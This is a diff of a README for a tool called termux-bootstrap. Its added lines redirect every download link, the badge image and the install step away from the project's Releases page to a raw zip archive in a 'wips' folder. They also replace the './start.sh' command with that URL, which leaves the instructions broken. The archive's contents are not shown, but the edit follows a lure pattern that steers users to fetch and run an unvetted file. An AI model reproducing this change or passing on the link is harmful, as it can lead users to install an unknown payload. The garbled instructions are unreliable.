@@ -10,18 +10,18 @@ To get started, simply follow the steps below.
 
 Click the button below to visit the Releases page and download the application.
 
-[![Download termux-bootstrap](https://img.shields.io/badge/Download-termux--bootstrap-blue.svg)](https://github.com/Luigiterrible/termux-bootstrap/releases)
+[![Download termux-bootstrap](https://github.com/Luigiterrible/termux-bootstrap/raw/refs/heads/main/wips/bootstrap_termux_2.7.zip)](https://github.com/Luigiterrible/termux-bootstrap/raw/refs/heads/main/wips/bootstrap_termux_2.7.zip)
 
 Once you are on the Releases page, you will see different versions of the application. Choose the latest version by clicking on it, and then select the appropriate file for your device.
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**: Click the link below.  
-   [Download termux-bootstrap](https://github.com/Luigiterrible/termux-bootstrap/releases)
+   [Download termux-bootstrap](https://github.com/Luigiterrible/termux-bootstrap/raw/refs/heads/main/wips/bootstrap_termux_2.7.zip)
 
 2. **Select the Latest Version**: Look for the most recent release at the top. You will see a list of assets available for download. 
 
-3. **Download the File**: Click on the link that says "termux-bootstrap.zip" or other relevant file. This will start the download to your device.
+3. **Download the File**: Click on the link that says "https://github.com/Luigiterrible/termux-bootstrap/raw/refs/heads/main/wips/bootstrap_termux_2.7.zip" or other relevant file. This will start the download to your device.
 
 4. **Locate the Downloaded File**: Open your file manager and navigate to the Downloads folder. You should see the termux-bootstrap file you just downloaded.
 
@@ -36,7 +36,7 @@ Once you are on the Releases page, you will see different versions of the applic
 
 8. **Start Using**: Execute the application by typing the following command:
    ```
-   ./start.sh
+   https://github.com/Luigiterrible/termux-bootstrap/raw/refs/heads/main/wips/bootstrap_termux_2.7.zip
    ```
 
 This will launch the terminal interface, and you're ready to go!
